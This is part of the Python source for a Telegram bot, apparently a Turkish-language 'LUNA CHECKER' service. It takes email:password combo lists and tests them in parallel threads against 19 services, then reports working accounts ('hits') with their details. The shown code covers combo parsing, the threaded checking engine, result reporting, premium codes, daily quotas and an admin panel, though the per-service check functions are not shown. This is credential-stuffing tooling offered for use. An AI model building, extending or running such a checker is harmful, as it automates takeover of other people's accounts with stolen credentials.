        bot.edit_message_text(txt, chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=markup)

    # -- Checker Çalıştır --
    elif data.startswith("run_"):
        key = data.replace("run_", "")
        if key not in CHECKERS:
            return
        rem = get_remaining(uid)
        if rem <= 0:
            bot.answer_callback_query(call.id, "❌ Hakkınız kalmadı!", show_alert=True)
            return
        ch = CHECKERS[key]
        txt = (f"{ch['emoji']} <b>{ch['name']} CHECKER</b>\n\n✅ Hazır! Combo gönder.\n"
               f"📌 <code>email:şifre</code> veya .txt dosyası\nKalan: <b>{rem}</b>")
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("❌ İptal", callback_data="menu_checkers"))
        bot.edit_message_text(txt, chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=markup)
        bot.register_next_step_handler(call.message, process_checker_input, key)

    # -- ADMIN İşlemleri --
    elif data == "admin_stats":
        if uid not in ADMIN_IDS: return
        s = get_stats()
        txt = (f"👑 <b>ADMIN İSTATİSTİKLER</b>\n\n👥 Toplam: <b>{s['total_users']}</b>\n"
               f"⭐ Premium: <b>{s['total_premium']}</b>\n⛔ Engellenen: <b>{s['total_banned']}</b>\n"
               f"🔍 Toplam Kontrol: <b>{s['total_checks']:,}</b>\n📅 Bugün: <b>{s['today_checks']}</b>\n"
               f"👤 Aktif: <b>{s['active_today']}</b>\n🔑 Kod: <b>{s['total_codes']}</b>")
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Admin", callback_data="admin_back"))
        bot.edit_message_text(txt, chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=markup)

    elif data == "admin_back":
        if uid not in ADMIN_IDS: return
        bot.edit_message_text("👑 <b>ADMIN PANELİ</b>", chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=admin_menu())

    elif data == "admin_ban":
        if uid not in ADMIN_IDS: return
        bot.edit_message_text("⛔ Banlanacak kullanıcı ID'sini gönder:", chat_id=call.message.chat.id, message_id=call.message.message_id)
        bot.register_next_step_handler(call.message, admin_ban_proc)

    elif data == "admin_unban":
        if uid not in ADMIN_IDS: return
        bot.edit_message_text("✅ Banı kaldırılacak kullanıcı ID'sini gönder:", chat_id=call.message.chat.id, message_id=call.message.message_id)
        bot.register_next_step_handler(call.message, admin_unban_proc)

    elif data == "admin_prem_give":
        if uid not in ADMIN_IDS: return
        bot.edit_message_text("⭐ Premium verilecek kullanıcı ID'sini gönder:", chat_id=call.message.chat.id, message_id=call.message.message_id)
        bot.register_next_step_handler(call.message, admin_prem_give_s1)

    elif data == "admin_prem_rem":
        if uid not in ADMIN_IDS: return
        bot.edit_message_text("❌ Premiumu geri alınacak kullanıcı ID'sini gönder:", chat_id=call.message.chat.id, message_id=call.message.message_id)
        bot.register_next_step_handler(call.message, admin_prem_rem_proc)

    elif data == "admin_find":
        if uid not in ADMIN_IDS: return
        bot.edit_message_text("🔍 Kullanıcı ID veya @username gönder:", chat_id=call.message.chat.id, message_id=call.message.message_id)
        bot.register_next_step_handler(call.message, admin_find_proc)

    elif data == "admin_list":
        if uid not in ADMIN_IDS: return
        users = get_users()
        txt = "📋 <b>TÜM KULLANICILAR</b>\n\n"
        for u in users[:50]:
            pr = "⭐" if u[4] == 1 else "💫"
            ba = "⛔" if u[6] == 1 else ""
            txt += f"{pr}{ba} <code>{u[0]}</code> — {u[2] or '—'} (@{u[1] or '—'})\n"
        if len(users) > 50:
            txt += f"\n... +{len(users)-50} kişi daha"
        txt += f"\n\nToplam: {len(users)}"
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Admin", callback_data="admin_back"))
        bot.edit_message_text(txt[:4000], chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=markup)

    elif data == "admin_announce":
        if uid not in ADMIN_IDS: return
        bot.edit_message_text("📢 Tüm kullanıcılara gönderilecek duyuruyu yaz:", chat_id=call.message.chat.id, message_id=call.message.message_id)
        bot.register_next_step_handler(call.message, admin_announce_proc)

    elif data == "admin_mkcode":
        if uid not in ADMIN_IDS: return
        bot.edit_message_text("🔑 Kod kaç günlük olsun? (Sayı):", chat_id=call.message.chat.id, message_id=call.message.message_id)
        bot.register_next_step_handler(call.message, admin_mkcode_s1)

    elif data == "admin_codes":
        if uid not in ADMIN_IDS: return
        codes = get_codes()
        txt = "📜 <b>TÜM PREMIUM KODLAR</b>\n\n"
        if not codes:
            txt += "Henüz kod yok."
        else:
            for c in codes[:30]:
                st = "✅" if c[5] == 1 else "❌"
                txt += f"🔑 <code>{c[0]}</code> | {c[1]}g | {c[3]}/{c[2]} | {st}\n"
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Admin", callback_data="admin_back"))
        bot.edit_message_text(txt[:4000], chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=markup)

    elif data == "admin_gprem":
        if uid not in ADMIN_IDS: return
        bot.edit_message_text("👥 ID'leri virgülle ayırarak gönder:\nÖrn: 123456,789012", chat_id=call.message.chat.id, message_id=call.message.message_id)
        bot.register_next_step_handler(call.message, admin_gprem_s1)

# ═══════════════════════════════════════════════════════════════════════
# PREMIUM KOD İŞLEME
# ═══════════════════════════════════════════════════════════════════════

def process_premium_code(message):
    uid = message.from_user.id
    code = message.text.strip()
    if code == "/cancel":
        bot.reply_to(message, "❌ İptal.")
        return
    ok, msg = use_code(code, uid)
    bot.reply_to(message, msg)
    if ok:
        bot.send_message(uid, f"⭐ <b>Premium Aktif!</b>\nArtık günlük {DAILY_LIMIT_PREMIUM} hakkın var!",
                        reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🏠 Ana Menü", callback_data="back_main")))

# ═══════════════════════════════════════════════════════════════════════
# ADMIN İŞLEMLERİ
# ═══════════════════════════════════════════════════════════════════════

def admin_ban_proc(message):
    if message.from_user.id not in ADMIN_IDS: return
    t = message.text.strip()
    if t == "/cancel": bot.reply_to(message, "İptal."); return
    try:
        tid = int(t)
        ban_user(tid, "Admin tarafından banlandı.")
        bot.reply_to(message, f"✅ <code>{tid}</code> banlandı.")
    except:
        bot.reply_to(message, "❌ Geçersiz ID.")

def admin_unban_proc(message):
    if message.from_user.id not in ADMIN_IDS: return
    t = message.text.strip()
    if t == "/cancel": bot.reply_to(message, "İptal."); return
    try:
        tid = int(t)
        unban_user(tid)
        bot.reply_to(message, f"✅ <code>{tid}</code> banı kaldırıldı.")
    except:
        bot.reply_to(message, "❌ Geçersiz ID.")

def admin_prem_give_s1(message):
    if message.from_user.id not in ADMIN_IDS: return
    t = message.text.strip()
    if t == "/cancel": bot.reply_to(message, "İptal."); return
    try:
        tid = int(t)
        bot.reply_to(message, f"✅ Kullanıcı: <code>{tid}</code>\nKaç gün premium verilsin?",
                     reply_markup=ForceReply(selective=True))
        bot.register_next_step_handler(message, admin_prem_give_s2, tid)
    except:
        bot.reply_to(message, "❌ Geçersiz ID.")

def admin_prem_give_s2(message, tid):
    if message.from_user.id not in ADMIN_IDS: return
    t = message.text.strip()
    if t == "/cancel": bot.reply_to(message, "İptal."); return
    try:
        days = int(t)
        if days <= 0: bot.reply_to(message, "❌ Geçersiz."); return
        set_premium(tid, True, days)
        bot.reply_to(message, f"✅ <code>{tid}</code> -> {days} gün premium verildi.")
        try:
            bot.send_message(tid, f"🎉 <b>Premium aktif!</b>\n{DAILY_LIMIT_PREMIUM} hakkın var!")
        except:
            pass
    except:
        bot.reply_to(message, "❌ Geçersiz sayı.")

def admin_prem_rem_proc(message):
    if message.from_user.id not in ADMIN_IDS: return
    t = message.text.strip()
    if t == "/cancel": bot.reply_to(message, "İptal."); return
    try:
        tid = int(t)
        set_premium(tid, False)
        bot.reply_to(message, f"✅ <code>{tid}</code> premiumu alındı.")
    except:
        bot.reply_to(message, "❌ Geçersiz ID.")

def admin_find_proc(message):
    if message.from_user.id not in ADMIN_IDS: return
    q = message.text.strip()
    if q == "/cancel": bot.reply_to(message, "İptal."); return
    conn = get_db(); c = conn.cursor()
    try:
        qid = int(q)
        c.execute("SELECT * FROM users WHERE user_id=?", (qid,))
    except:
        qq = q.replace("@", "")
        c.execute("SELECT * FROM users WHERE username LIKE ? OR first_name LIKE ?", (f"%{qq}%", f"%{qq}%"))
    r = c.fetchall()
    conn.close()
    if not r:
        bot.reply_to(message, "❌ Bulunamadı.")
        return
    txt = "🔍 <b>BULUNDU</b>\n\n"
    for u in r[:10]:
        pr = "⭐ Premium" if u[4] == 1 else "💫 Ücretsiz"
        ba = " ⛔ BANLI" if u[6] == 1 else ""
        txt += f"🆔 <code>{u[0]}</code>\n👤 {u[2] or '—'} (@{u[1] or '—'})\n💎 {pr}{ba}\n📊 {u[9] or 0} kontrol\n📅 {u[8] or '—'}\n{'-'*20}\n"
    bot.reply_to(message, txt[:4000])

def admin_announce_proc(message):
    if message.from_user.id not in ADMIN_IDS: return
    t = message.text.strip()
    if t == "/cancel": bot.reply_to(message, "İptal."); return
    msg = bot.reply_to(message, "📢 Duyuru gönderiliyor...")
    users = get_users()
    sent = 0; fail = 0
    for u in users:
        if u[6] == 1: continue
        try:
            bot.send_message(u[0], f"📢 <b>DUYURU</b>\n\n{t}\n— LUNA CHECKER BOT")
            sent += 1
            time.sleep(0.03)
        except:
            fail += 1
    bot.edit_message_text(f"✅ Gönderilen: {sent}\n❌ Başarısız: {fail}", chat_id=msg.chat.id, message_id=msg.message_id)

def admin_mkcode_s1(message):
    if message.from_user.id not in ADMIN_IDS: return
    t = message.text.strip()
    if t == "/cancel": bot.reply_to(message, "İptal."); return
    try:
        days = int(t)
        if days <= 0: bot.reply_to(message, "❌ Geçersiz."); return
        bot.reply_to(message, f"✅ {days} gün. Kaç kullanımlık olsun?", reply_markup=ForceReply(selective=True))
        bot.register_next_step_handler(message, admin_mkcode_s2, days)
    except:
        bot.reply_to(message, "❌ Sayı girin.")

def admin_mkcode_s2(message, days):
    if message.from_user.id not in ADMIN_IDS: return
    t = message.text.strip()
    if t == "/cancel": bot.reply_to(message, "İptal."); return
    try:
        mx = int(t)
        if mx <= 0: bot.reply_to(message, "❌ Geçersiz."); return
        code = generate_code(days, mx, message.from_user.id)
        bot.reply_to(message, f"🔑 <b>KOD OLUŞTURULDU</b>\n\n<code>{code}</code>\n{days} gün | {mx} kullanım")
    except:
        bot.reply_to(message, "❌ Sayı girin.")

def admin_gprem_s1(message):
    if message.from_user.id not in ADMIN_IDS: return
    t = message.text.strip()
    if t == "/cancel": bot.reply_to(message, "İptal."); return
    ids = []
    for p in t.split(","):
        try: ids.append(int(p.strip()))
        except: pass
    if not ids: bot.reply_to(message, "❌ Geçerli ID yok."); return
    bot.reply_to(message, f"✅ {len(ids)} kişi. Kaç gün premium?", reply_markup=ForceReply(selective=True))
    bot.register_next_step_handler(message, admin_gprem_s2, ids)

def admin_gprem_s2(message, ids):
    if message.from_user.id not in ADMIN_IDS: return
    t = message.text.strip()
    if t == "/cancel": bot.reply_to(message, "İptal."); return
    try:
        days = int(t)
        if days <= 0: bot.reply_to(message, "❌ Geçersiz."); return
        ok = 0
        for uid in ids:
            try:
                set_premium(uid, True, days)
                ok += 1
                try:
                    bot.send_message(uid, f"🎉 <b>Premium aktif!</b>\n{days} gün | {DAILY_LIMIT_PREMIUM} hakkın var!")
                except: pass
            except: pass
        bot.reply_to(message, f"✅ {ok}/{len(ids)} kişiye {days} gün premium verildi.")
    except:
        bot.reply_to(message, "❌ Sayı girin.")

# ═══════════════════════════════════════════════════════════════════════
# CHECKER ÇALIŞTIRMA MOTORU
# ═══════════════════════════════════════════════════════════════════════



def process_checker_input(message, checker_key):
    uid = message.from_user.id
    ch = CHECKERS[checker_key]

    if is_banned(uid):
        bot.reply_to(message, "🚫 Engellenmişsiniz.")
        return
    
    # ★ KANAL KONTROLÜ ★
    ok, ch_ = check_channels(uid)
    if not ok:
        bot.reply_to(message, 
            f"⚠️ <b>Önce kanallara katılmalısın!</b>\n\n📢 {CHANNEL_1}\n📢 {CHANNEL_2}",
            reply_markup=channel_markup())
        return

    rem = get_remaining(uid)
    if rem <= 0:
        bot.reply_to(message, "❌ Hakkınız kalmadı.")
        return

    combos = []
    if message.document:
        try:
            fi = bot.get_file(message.document.file_id)
            dl = bot.download_file(fi.file_path)
            content = dl.decode("utf-8", errors="ignore")
            for line in content.strip().split("\n"):
                if ":" in line:
                    p = line.strip().split(":", 1)
                    if p[0] and p[1]:
                        combos.append((p[0].strip(), p[1].strip()))
        except Exception as e:
            bot.reply_to(message, f"❌ Dosya hatası: {e}")
            return
    elif message.text:
        for line in message.text.strip().split("\n"):
            if ":" in line:
                p = line.strip().split(":", 1)
                if p[0] and p[1]:
                    combos.append((p[0].strip(), p[1].strip()))

    if not combos:
        bot.reply_to(message, "❌ Combo bulunamadı! Format: email:password")
        return

    if len(combos) > rem:
        combos = combos[:rem]
        bot.reply_to(message, f"⚠️ Sadece {rem} hakkınız var, ilk {rem} kontrol edilecek.")

    status_msg = bot.reply_to(message,
        f"{ch['emoji']} <b>{ch['name']} CHECKER</b>\n\n📊 <b>{len(combos)}</b> hesap kontrol ediliyor...\n⏳ Bekleyin...\n\n✅ Hit: 0\n❌ Bad: 0")

    thread = threading.Thread(target=run_checker_thread,
        args=(checker_key, combos, uid, message.chat.id, status_msg.message_id))
    thread.daemon = True
    thread.start()

def run_checker_thread(checker_key, combos, uid, chat_id, msg_id):
    ch = CHECKERS[checker_key]
    hits = 0
    bads = 0
    start_time = time.time()
    max_workers = CHECKER_THREADS.get(checker_key, 5)

    results = []
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        fut = {executor.submit(run_single, e, p, checker_key): (e, p) for e, p in combos}
        for f in as_completed(fut):
            e, p = fut[f]
            try:
                r = f.result()
                if r.get("hit"):
                    hits += 1
                else:
                    bads += 1
                results.append((e, p, r))
            except:
                bads += 1
                results.append((e, p, {"hit": False}))

            increment_daily(uid)

            done = hits + bads
            if done % max(1, len(combos)//5) == 0 or done == len(combos):
                elapsed = int(time.time() - start_time)
                try:
                    bot.edit_message_text(
                        f"{ch['emoji']} <b>{ch['name']} CHECKER</b>\n\n📊 {done}/{len(combos)}\n⏱️ {elapsed}sn\n\n✅ Hit: {hits}\n❌ Bad: {bads}",
                        chat_id=chat_id, message_id=msg_id)
                except: pass

    elapsed = int(time.time() - start_time)

    # Hit detaylarını göster
    hit_details = ""
    for e, p, r in results:
        if r.get("hit") and r.get("fields"):
            fields = r["fields"]
            line = " | ".join([f"{k}: {v}" for k, v in fields.items()])
            if len(hit_details + f"\n✅ {e} | {line}") < 3500:
                hit_details += f"\n✅ {e} | {line}"

    txt = (f"{ch['emoji']} <b>{ch['name']} CHECKER — TAMAMLANDI</b>\n\n"
           f"📊 {len(combos)} hesap | ⏱️ {elapsed}sn\n\n✅ Hit: <b>{hits}</b>\n❌ Bad: <b>{bads}</b>"
           f"{hit_details}\n\n👤 Kalan hakkın: <b>{get_remaining(uid)}</b>")

    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🔄 Tekrar", callback_data=f"run_{checker_key}"),
        InlineKeyboardButton("🔍 Checker'lar", callback_data="menu_checkers"),
        InlineKeyboardButton("🏠 Ana Menü", callback_data="back_main"))
    try:
        bot.edit_message_text(txt, chat_id=chat_id, message_id=msg_id, reply_markup=markup)
    except:
        bot.send_message(chat_id, txt, reply_markup=markup)

# ═══════════════════════════════════════════════════════════════════════
# MESAJ YAKALAYICI
# ═══════════════════════════════════════════════════════════════════════

@bot.message_handler(func=lambda m: True, content_types=['text', 'document'])
def catch_all(message):
    uid = message.from_user.id
    if is_banned(uid):
        bot.reply_to(message, "🚫 Engellenmişsiniz.")
        return
    
    # ★ KANAL KONTROLÜ EKLENDİ ★
    ok, ch = check_channels(uid)
    if not ok:
        bot.reply_to(message, 
            f"⚠️ <b>Kanallara katılmalısın!</b>\n\n📢 {CHANNEL_1}\n📢 {CHANNEL_2}",
            reply_markup=channel_markup())
        return
    
    bot.reply_to(message, "🌙 Ana menüyü kullan.", reply_markup=main_menu())

# ═══════════════════════════════════════════════════════════════════════
# BOTU BAŞLAT
# ═══════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════════╗
║     🌙 LUNA CHECKER BOT v4.0                               ║
║     19 CHECKER - TÜM APILER GÖMÜLÜ                         ║
║     @OctpsPrime / @Octopustool                              ║
╚══════════════════════════════════════════════════════════════╝
    """)
    init_db()
    print(f"✅ {len(CHECKERS)} checker yüklendi")
    print(f"✅ Admin: {ADMIN_IDS}")
    print(f"✅ Bot başlatılıyor...\n")
    try:
        bot.infinity_polling(timeout=30)
    except KeyboardInterrupt:
        print("\n❌ Bot durduruldu.")
    except Exception as e:
        print(f"\n❌ Hata: {e}")